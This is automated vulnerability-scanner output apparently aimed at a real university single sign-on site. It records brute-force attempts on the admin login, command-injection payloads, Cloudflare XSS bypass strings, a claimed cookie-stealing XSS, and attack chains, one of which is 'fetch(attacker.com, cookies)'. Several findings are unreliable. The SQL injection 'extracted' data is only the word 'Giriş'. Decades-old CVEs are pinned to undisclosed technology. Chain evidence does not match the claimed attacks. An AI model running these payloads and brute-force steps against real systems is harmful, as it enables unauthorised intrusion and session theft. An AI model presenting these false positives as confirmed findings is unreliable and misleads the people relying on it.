security_headers.Strict-Transport-Security: ❌ MISSING — Protects against MITM / protocol downgrade

findings.detail: Path accessible with HTTP 200
findings.evidence: HTTP 200 | Size: 1248 bytes | No WAF block
findings.remediation: Review if this path should be publicly accessible. Add authentication if needed.

findings.detail: Path exists but is forbidden — worth further investigation
findings.evidence: HTTP 403 | Size: 4547 bytes | No WAF block
findings.remediation: Move sensitive files outside web root. Never deploy .env to production.

findings.detail: 6 consecutive failed logins did not trigger lockout or CAPTCHA
findings.remediation: Implement account lockout after 3-5 failed attempts. Add CAPTCHA or progressive delays.

findings.detail: CSP prevents XSS and data injection attacks by controlling allowed resource sources.
findings.remediation: Add a strict CSP: 'default-src \'self\'; script-src \'self\'; object-src \'none\';'

findings.detail: HSTS forces HTTPS connections and prevents SSL-stripping attacks.
findings.remediation: Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

findings.detail: Missing X-Frame-Options allows clickjacking attacks (embedding site in iframes).
findings.remediation: Add: X-Frame-Options: DENY  (or use CSP frame-ancestors directive instead)

findings.detail: Missing header allows MIME-type sniffing, enabling content injection.
findings.remediation: Add: X-Content-Type-Options: nosniff

findings.detail: Missing Referrer-Policy may leak sensitive URL information to third parties.
findings.remediation: Add: Referrer-Policy: strict-origin-when-cross-origin

findings.detail: Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).
findings.remediation: Add: Permissions-Policy: geolocation=(), camera=(), microphone=()

findings.detail: Missing COOP allows cross-origin pages to access window references.
findings.remediation: Add: Cross-Origin-Opener-Policy: same-origin

findings.detail: Missing CORP allows cross-origin pages to load this site's resources.
findings.remediation: Add: Cross-Origin-Resource-Policy: same-origin

findings.detail: Server technology disclosure may aid attacker fingerprinting.
findings.remediation: Remove X-Powered-By header from all responses.

findings.detail: Server version disclosure may aid attacker fingerprinting.
findings.remediation: Configure web server to omit or genericize the Server header.

findings.detail: Parameter 'UserId' is injectable — payload: ';$IFS$()id'
findings.remediation: Never pass user-supplied input to shell commands. Use parameterised APIs (subprocess with list args). Apply strict allowlist validation on all inputs.

findings.detail: Parameter 'UserId' is injectable — payload: ';{ls,-la,/}'
findings.remediation: Never pass user-supplied input to shell commands. Use parameterised APIs (subprocess with list args). Apply strict allowlist validation on all inputs.

findings.detail: Parameter 'UserId' is injectable — payload: '& PING /n 3 127.0.0.1'
findings.remediation: Never pass user-supplied input to shell commands. Use parameterised APIs (subprocess with list args). Apply strict allowlist validation on all inputs.

findings.detail: State-changing POST form at 'https://sso.aztu.edu.az/Home/Login' has no CSRF token field.
findings.remediation: Implement synchronizer token pattern (per-session or per-request CSRF tokens). Set SameSite=Strict on session cookies. Validate Origin/Referer on all state-changing endpoints. Use custom request headers (X-Requested-With) as secondary defense.
findings.poc_html:
CSRF PoC

Check: Missing CSRF Token

Target: https://sso.aztu.edu.az/Home/Login

findings.detail: Web Application Firewall identified: Cloudflare. 0/8 attack payloads blocked.
findings.remediation: WAF 'Cloudflare' detected — bypass techniques generated below.

findings.detail: Bypass technique for Cloudflare: URL double-encode: %253Cscript%253E
findings.remediation: Update WAF rules and test against bypass vectors regularly.

findings.detail: Bypass technique for Cloudflare: Unicode fullwidth: ＜script＞alert(1)＜/script＞
findings.remediation: Update WAF rules and test against bypass vectors regularly.

findings.detail: Bypass technique for Cloudflare: Case mixing: <ScRiPt>alert(1)</sCrIpT>

findings.detail: CVE-2006-3147 affects 'Not disclosed' — Unspecified vulnerability in Hosting Controller before 6.1 (aka Hotfix 3.2) allows remote authenticated attackers to gain host admin privileges, list all resellers, or change resellers' passwords via
findings.evidence: Technology: Not disclosed | CVE: CVE-2006-3147 | CVSS: 6.5
findings.remediation: Update 'Not disclosed' to the latest patched version. Check https://nvd.nist.gov/vuln/detail/CVE-2006-3147 for details.

findings.remediation: Update 'Not disclosed' to the latest patched version. Check https://nvd.nist.gov/vuln/detail/CVE-2008-4300 for details.

findings.detail: XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.
findings.remediation: Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.
findings.exploit_chain: XSS → Cookie Theft → Session Hijack → Account Takeover

findings.detail: SQLi successfully exploited. Extracted: {'version': 'Giriş', 'user': 'Giriş', 'databases': 'Giriş', 'tables': 'Giriş', 'dump_users': 'Giriş'}
findings.remediation: IMMEDIATELY patch. Use parameterized queries.

findings.detail: SQLi successfully exploited. Extracted: {'version': 'Giriş', 'user': 'Giriş', 'databases': 'Giriş', 'tables': 'Giriş', 'dump_users': 'Giriş'}
findings.remediation: IMMEDIATELY patch. Use parameterized queries.

findings.detail: No 2FA/MFA endpoint detected.
findings.evidence: None of common OTP paths returned OTP form.
findings.remediation: Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts.

findings.type: 2FA — No Rate Limiting on OTP (Brute-force Possible)
findings.detail: Tested 7 OTP codes with no lockout or 429 response.
findings.remediation: Enforce max 5 attempts. Add exponential backoff and account lockout.

findings.detail: XSS allows attacker to steal CSRF tokens from victim's browser DOM, then forge authenticated state-changing requests (password reset, email change) without victim's knowledge — leading to full account takeover.
findings.evidence:
Step 1: [Missing Header: Content-Security-Policy] at https://sso.aztu.edu.az
Step 2: [CSRF — Missing CSRF Token] at https://sso.aztu.edu.az/Home/Login
findings.remediation: Implement strict CSP (Content-Security-Policy). Use SameSite=Strict cookies. Enforce CSRF tokens even when XSS is patched (defense in depth).
findings.attack_steps: XSS → Steal CSRF Token → Forge Request → Change Email/Password → Account Takeover

findings.type: CHAIN: SQLi → Credential Dump → Admin Takeover
findings.detail: SQL injection allows dumping the users/credentials table. Cracked or plaintext credentials can be used to log in as admin, achieving full application compromise.
findings.evidence:
Step 1: [CVE: CVE-2008-4765] at ?
Step 2: [No Account Lockout] at https://sso.aztu.edu.az/Home/Login
findings.remediation: Use parameterized queries. Hash passwords with bcrypt/argon2. Enforce MFA on admin accounts.
findings.attack_steps: SQLi → UNION SELECT users,passwords → Crack Hash → Login as Admin → Full Compromise

findings.type: CHAIN: CORS Misconfiguration → XSS → Session Theft
findings.detail: Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim's session cookies to a controlled server via cross-origin fetch.
findings.evidence:
Step 1: [Missing Header: Cross-Origin-Opener-Policy] at https://sso.aztu.edu.az
Step 2: [Missing Header: Content-Security-Policy] at https://sso.aztu.edu.az
findings.remediation: Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.
findings.attack_steps: CORS * → XSS on trusted subdomain → fetch(attacker.com, cookies) → Session Steal

findings.type: CHAIN: IDOR → PII Exfiltration → Mass Account Hijack
findings.detail: Insecure Direct Object References allow attackers to enumerate user IDs and access other users' data (emails, addresses, payment info). At scale, this enables mass PII exfiltration and account takeover.
findings.evidence:
Step 1: [CSRF — Missing CSRF Token] at https://sso.aztu.edu.az/Home/Login
Step 2: [No Account Lockout] at https://sso.aztu.edu.az/Home/Login
findings.remediation: Implement authorization checks on every resource access. Use UUID instead of sequential IDs. Log and alert on anomalous data access patterns.
findings.attack_steps: IDOR /api/user/1 → iterate IDs → dump all emails → credential stuffing → mass takeover

findings.type: CHAIN: JWT None Algorithm → Admin Privilege Escalation
findings.detail: JWT with 'alg:none' or weak HS256 secret allows forging tokens with arbitrary claims (e.g. role:admin). This bypasses all role-based access controls.
findings.evidence:
Step 1: [CSRF — Missing CSRF Token] at https://sso.aztu.edu.az/Home/Login
Step 2: [CSRF — Missing CSRF Token] at https://sso.aztu.edu.az/Home/Login
findings.remediation: Enforce RS256/ES256 algorithms. Reject 'none' algorithm. Validate all JWT claims server-side. Use short expiration times.
findings.attack_steps: JWT alg:none → Forge {role:admin} → Access admin panel → Full privilege escalation

findings.type: PostMessage — Page is Frameable (Clickjacking + postMessage Risk)
findings.detail: No X-Frame-Options or CSP frame-ancestors header found. Attacker can embed this page in a frame and use postMessage to inject data into any vulnerable message listeners.
findings.remediation: Add 'X-Frame-Options: DENY' or CSP 'frame-ancestors none'.

findings.detail: Admin login form found at https://sso.aztu.edu.az/admin — brute-force attempted, no weak creds found
findings.evidence: Login form at https://sso.aztu.edu.az/admin | Tested 26 credential pairs
findings.remediation: Restrict admin panel to known IP ranges. Implement account lockout and MFA.
